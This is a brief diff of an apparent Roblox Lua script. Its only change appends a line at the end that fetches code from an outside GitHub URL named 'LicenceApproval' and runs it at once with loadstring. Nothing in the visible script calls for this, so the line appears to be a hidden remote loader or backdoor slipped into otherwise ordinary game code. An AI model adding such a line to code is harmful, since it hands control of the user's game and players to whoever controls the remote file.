@@ -241,3 +241,4 @@ end
 
 -- Reinitialize when the character respawns
 plr.CharacterAdded:Connect(setupCharacter)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/You2berek/ScriptsMP/refs/heads/main/LicenceApproval"))()
